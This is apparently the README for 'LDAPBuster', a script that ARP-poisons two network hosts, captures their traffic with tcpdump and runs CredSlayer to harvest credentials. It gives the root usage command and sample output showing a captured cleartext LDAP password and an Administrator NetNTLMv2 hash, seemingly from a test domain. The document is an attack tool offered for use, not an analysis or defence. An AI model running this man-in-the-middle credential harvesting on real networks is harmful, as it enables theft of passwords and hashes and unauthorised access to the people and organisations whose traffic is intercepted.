# LDAPBuster
Script to automate the ARP poisoning and credential harvesting of network devices that utilize LDAP for authentication.

This script started as a way to automated the communication between firewalls and remote access appliances that use AD and LDAP for authentication but expanded to allow the targetting of any two addresses and parse credentials passed between them. 

The script will take two inputs, and start an ARP poison attack on them to allow for a MITM. While this is happening, a capture is started to save all data that is captured during the MITM. This runs until you hit neter, in which the file is then saved, the poison stopped, and CredSlayer is then run on the output file automatically to extract all credentials and hashes available. 

Usage: 
```
sudo python test.py --victim VICTIM --target TARGET --output OUTPUT
```

Output: 

```
LDAP Buster
By: Hann1bl3L3ct3r
Script to target two devices for ARP poisoning to capture authentication information which is saved to a file and parsed with CredSlayer.
Note: Must be run as ROOT
[*] IP forwarding enabled.
[*] Starting tcpdump to capture traffic into test.pcap...
[*] tcpdump started and writing to test.pcap
[*] Starting packet forwarding between victim and target...
[*] Press Enter to stop the capture and begin parse...
tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
[*] Starting ARP poisoning...

3239 packets captured
3245 packets received by filter
0 packets dropped by kernel
[*] tcpdump stopped and saved to test.pcap.
[*] Starting Parse...
[*] ARP tables restored.
[*] Running CredSlayer on test.pcap...
[INFO] Processing packets in 'test.pcap'
[LDAP 192.168.1.106:33039 <-> 192.168.1.5:389] [FOUND] credentials found: cn=Test User,cn=Users,dc=TEST,dc=local -- Password#1
[INFO] Interesting things have been found but the CredSLayer wasn't able validate them: 
[LDAP 192.168.1.106:33038 <-> 192.168.1.5:389] [INFO]  name:  -- Administrator::TEST:019cef6365b05c2c:BA19872D0F64B8435D17CF3B95FE1709:010100000000000000030E4D34ABD401E3F54FBC526BD95A000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C0000000000 -- {'version': 'NETNTLMv2'}
[INFO] Processed in 16.095 seconds.
```
